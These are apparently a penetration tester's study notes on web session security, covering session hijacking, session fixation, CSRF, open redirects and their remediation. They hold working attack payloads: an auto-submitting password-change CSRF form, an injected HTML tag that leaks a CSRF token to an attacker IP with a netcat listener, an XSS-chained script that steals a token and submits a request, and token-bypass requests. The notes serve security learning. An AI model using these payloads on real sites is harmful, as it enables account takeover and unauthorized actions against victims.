---
title: Notes | Session Security
author: Zeropio
date: 2022-04-24
categories: [Notes, Vulnerabilities]
tags: [csrf, xss]
permalink: /notes/vulnerabilities/session-security
---

A user session can be defined as a sequence of requests originating from the same client and the associated responses during a specific time period. A **Unique Session Identifier** (**Session ID**) or token is the basis upon which user sessions are generated and distinguished. A session identifier can also be:
- Captured through passive traffic/packet sniffing
- Identified in logs
- Predicted
- Brute Forced

A session identifier's security level depends on its:
- **Validity Scope**: a secure session identifier should be valid for one session only
- **Randomness**: a secure session identifier should be generated through a robust random number/string generation algorithm so that it cannot be predicted
- **Validity Time**: a secure session identifier should expire after a certain amount of time

A session identifier's security level also depends on the location where it is stored:
- **URL**: If this is the case, the HTTP Referer header can leak a session identifier to other websites. In addition, browser history will also contain any session identifier stored in the URL.
- **HTML**: If this is the case, the session identifier can be identified in both the browser's cache memory and any intermediate proxies
- **sessionStorage**: SessionStorage is a browser storage feature introduced in HTML5. Session identifiers stored in sessionStorage can be retrieved as long as the tab or the browser is open. In other words, sessionStorage data gets cleared when the page session ends. Note that a page session survives over page reloads and restores.
- **localStorage**: LocalStorage is a browser storage feature introduced in HTML5. Session identifiers stored in localStorage can be retrieved as long as localStorage does not get deleted by the user. This is because data stored within localStorage will not be deleted when the browser process is terminated, with the exception of "private browsing" or "incognito" sessions where data stored within localStorage are deleted by the time the last tab is closed.

---

# Session Hijacking

In session hijacking attacks, the attacker takes advantage of insecure session identifiers, finds a way to obtain them, and uses them to authenticate to the server and impersonate the victim. An attacker can obtain a victim's session identifier using several methods, with the most common being:
- Passive Traffic Sniffing
- Cross-Site Scripting (XSS)
- Browser history or log-diving
- Read access to a database containing session information

Once we have the cookie of other user, we can just copy it in our machine and we will access his session.

---

# Session Fixation 

Session Fixation occurs when an attacker can fixate a (valid) session identifier. Such bugs usually occur when session identifiers (such as cookies) are being accepted from URL Query Strings or Post Data. Session Fixation attacks are usually mounted in three stages:

### Stage 1: Attacker manages to obtain a valid session identifier

Authenticating to an application is not always a requirement to get a valid session identifier, and a large number of applications assign valid session identifiers to anyone who browses them. This also means that an attacker can be assigned a valid session identifier without having to authenticate.

## Stage 2: Attacker manages to fixate a valid session identifier

- The assigned session identifier pre-login remains the same post-login and
- Session identifiers (such as cookies) are being accepted from URL Query Strings or Post Data and propagated to the application

If, for example, a session-related parameter is included in the URL (and not on the cookie header) and any specified value eventually becomes a session identifier, then the attacker can fixate a session.

### Stage 3: Attacker tricks the victim into establishing a session using the abovementioned session identifier

All the attacker has to do is craft a URL and lure the victim into visiting it. If the victim does so, the web application will then assign this session identifier to the victim.

---

# Obtaining Session Identifiers without User Interaction 

These attacking techniques can be split into two categories:
- Session ID-obtaining attacks **without** user interaction
- Session ID-obtaining attacks **requiring** user interaction

## via Traffic Sniffing 

Traffic sniffing is something that most penetration testers do when assessing a network's security from the inside. Obtaining session identifiers through traffic sniffing requires:
- The attacker must be positioned on the same local network as the victim
- Unencrypted HTTP traffic

With **Wireshark** we can sniff all the traffic throught a interface (or all of them).

## Cookie Stored 

Different programming languages save the cookies in different ways.

### PHP 

The entry `session.save_path` in `PHP.ini`{: .filepath} specifies where session data will be stored.

### Java 

Tomcat provides two standard implementations of Manager. The default implementation stores active sessions, while the optional one stores active sessions that have been swapped out in a storage location that is selected via the use of an appropriate Store nested element. The filename of the default session data file is `SESSIONS.ser`{: .filepath}.

### .NET 

Session data can be found in:
- The application worker process (`aspnet_wp.exe`) - This is the case in the InProc Session mode
- StateServer (A Windows Service residing on IIS or a separate server) - This is the case in the OutProc Session mode
An SQL Server

---

# Cross-Site Request Forgery 

**Cross-Site Request Forgery** (**CSRF** or **XSRF**) is an attack that forces an end-user to execute inadvertent actions on a web application in which they are currently authenticated. This attack is usually mounted with the help of attacker-crafted web pages that the victim must visit or interact with. During CSRF attacks, the attacker does not need to read the server's response to the malicious cross-site request. This means that **Same-Origin Policy** cannot be considered a security mechanism against CSRF attacks.

A web application is vulnerable to CSRF attacks when:
- All the parameters required for the targeted request can be determined or guessed by the attacker
- The application's session management is solely based on HTTP cookies, which are automatically included in browser requests

To successfully exploit a CSRF vulnerability, we need:
- To craft a malicious web page that will issue a valid (cross-site) request impersonating the victim
- The victim to be logged into the application at the time when the malicious cross-site request is issued

We can create a file similar to:
```html
<form  id ="form" action="http://<TARGET>/change-password/" method="POST">
    <input type="hidden" autocomplete="off" value="1234">
    <input type="hidden" autocomplete="off" value="1234">
    <input type="hidden" value="Change">
</form>

<script>document.getElementById('form').submit();</script>
```

Once a user load this file, without noticing anything his password will be change.

## GET-based 

If all the values are being send with a GET method we can see them in the URL. For example, we could see the **CSRF token** 


## POST-based 

For example, take a page that have the CSRF *hidden* during a POST request. We can try to break, and get the token:
```console
zero@pio$ nc -lvnp 9000
```

If we can write on the request, for example: `/app/delete/<your-email>` and change **<your-email>**, we can replace by:
```
<table%20background='%2f%2f<OUR IP>:<PORT>%2f
```

In our netcat we will receive the token.

## XSS & CSRF Chaining 

Sometimes, even if we manage to bypass CSRF protections, we may not be able to create cross-site requests due to some sort of same origin/same site restriction. If this is the case, we can try chaining vulnerabilities to get the end result of CSRF. We can execute the CSRF inside `<script>` brackets, for example:
```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/delete/EMAIL',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/delete', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token);
};
</script>
```

## Exploiting Weak CSRF Tokens 

ften, web applications do not employ very secure or robust token generation algorithms. An example is an application that generates CSRF tokens as follows: `md5(username)`.  We can register an account, look into the requests to identify a CSRF token, and then check if the MD5 hash of the username (or other similar values) is equal to the CSRF token's value. 

When assessing how robust a CSRF token generation mechanism is, make sure you spend a small amount of time trying to come up with the CSRF token generation mechanism. It can be as easy as md5(username), sha1(username), md5(current date + username) etc. Please note that you should not spend much time on this, but it is worth a shot.

## Additional CSRF Protection Bypasses 

### Null Value
You can try making the CSRF token a null value (empty), for example:
```
CSRF-token:
```

This may work because sometimes, the check is only looking for the header, and it does not validate the token value.

### Random CSRF Token 

Setting the CSRF token value to the same length as the original CSRF token but with a different/random value may also bypass some anti-CSRF protection that validates if the token has a value and the length of that value. For example, if the CSRF-Token were 32-bytes long, we would re-create a 32-byte token.

### Use Another Session’s CSRF Token 

Another anti-CSRF protection bypass is using the same CSRF token across accounts. This may work in applications that do not validate if the CSRF token is tied to a specific account or not and only check if the token is algorithmically correct.

### Request Method Tampering 

To bypass anti-CSRF protections, we can try changing the request method. From POST to GET and vice versa. 

### Delete the CSRF token parameter or send a blank token 

Not sending a token works fairly often because of the following common application logic mistake. Applications sometimes only check the token's validity if the token exists or if the token parameter is not blank. 

Request:
```html
POST /change_password
POST body:
new_password=qwerty&csrf_token=9cfffd9e8e78bd68975e295d1b3d3331
```

Test 1:
```html
POST /change_password
POST body:
new_password=qwerty
```

Test 2:
```html
POST /change_password
POST body:
new_password=qwerty&csrf_token=
```

### Session Fixation and CSRF

Sometimes, sites use something called a double-submit cookie as a defense against CSRF. This means that the sent request will contain the same random token both as a cookie and as a request parameter, and the server checks if the two values are equal. If the values are equal, the request is considered legitimate.

If the double-submit cookie is used as the defense mechanism, the application is probably not keeping the valid token on the server-side. It has no way of knowing if any token it receives is legitimate and merely checks that the token in the cookie and the token in the request body are the same.

Try a session fixation and then:
```html
POST /change_password
Cookie: CSRF-Token=fixed_token;
POST body:
new_password=pwned&CSRF-Token=fixed_token
```

### Anti-CSRF Protection via the Referrer Header 

If an application is using the referrer header as an anti-CSRF mechanism, you can try removing the referrer header. Add the following meta tag to your page hosting your CSRF script:
```html
<meta name="referrer" content="no-referrer"
```

### Bypass the Regex

Sometimes the Referrer has a whitelist regex or a regex that allows one specific domain. Let us suppose that the Referrer Header is checking for *google.com*. We could try something like *www.google.com.pwned.m3*, which may bypass the regex. You can try some of the following as well *www.target.com?www.pwned.m3* or *www.pwned.m3/www.target.com*.

--- 

# Open Redirect

An **Open Redirect** vulnerability occurs when an attacker can redirect a victim to an attacker-controlled site by abusing a legitimate application's redirection functionality. From an attacker's perspective, an open redirect vulnerability can prove extremely useful during the initial access phase since it can lead victims to attacker-controlled web pages through a page that they trust. Let us take a look at some code:
```php
$red = $_GET['url'];
header("Location: " . $red);
```

A variable called red is defined that gets its value from a parameter called url. `$_GET` is a PHP superglobal variable that enables us to access the url parameter value. The Location response header indicates the URL to redirect a page to. The line of code above sets the location to the value of *red*, without any validation. We are facing an Open Redirect vulnerability here.

Make sure you check for the following URL parameters when bug hunting, you'll often see them in login pages:
- `?url=`
- `?link=`
- `?redirect=`
- `?redirecturl=`
- `?redirect_uri=`
- `?return=`
- `?return_to=`
- `?returnurl=`
- `?go=`
- `?goto=`
- `?exit=`
- `?exitpage=`
- `?fromurl=`
- `?fromuri=`
- `?redirect_to=`
- `?next=`
- `?newurl=`
- `?redir=`

---

# Remediation 

## Session Hijacking 

It is pretty challenging to counter session hijacking since a valid session identifier grants access to an application by design. User session monitoring/anomaly detection solutions can detect session hijacking.  

## Session Fixation 

Ideally, session fixation can be remediated by generating a new session identifier upon an authenticated operation. Simply invalidating any pre-login session identifier and generating a new one post-login should be enough. As already mentioned, the established programming technologies contain built-in functions and utilize libraries for session management purposes. There is no need for custom implementations to remediate session fixation. Find some examples below:
```php
session_regenerate_id(bool $delete_old_session = false): bool
```

```java
session.invalidate();
session = request.getSession(true);
```

## CSRF 

It is recommended that whenever a request is made to access each function, a check should be done to ensure the user is authorized to perform that action. The preferred way to reduce the risk of a CSRF vulnerability is to modify session management mechanisms and implement additional, randomly generated, and non-predictable security tokens or responses to each HTTP request related to sensitive operations. Other mechanisms that can impede the ease of exploitation include: Referrer header checking. Performing verification on the order in which pages are called.

## Open Redirect 

The safe use of redirects and forwards can be done in several ways:
- Do not use user-supplied URLs and have methods to strictly validate the URL.
- If user input cannot be avoided, ensure that the supplied value is valid, appropriate for the application, and is authorized for the user.
- It is recommended that any destination input be mapped to a value rather than the actual URL or portion of the URL and that server-side code translates this value to the target URL.
- Sanitize input by creating a list of trusted URLs.
- Force all redirects to first go through a page notifying users that they are being redirected from your site and require them to click a link to confirm.

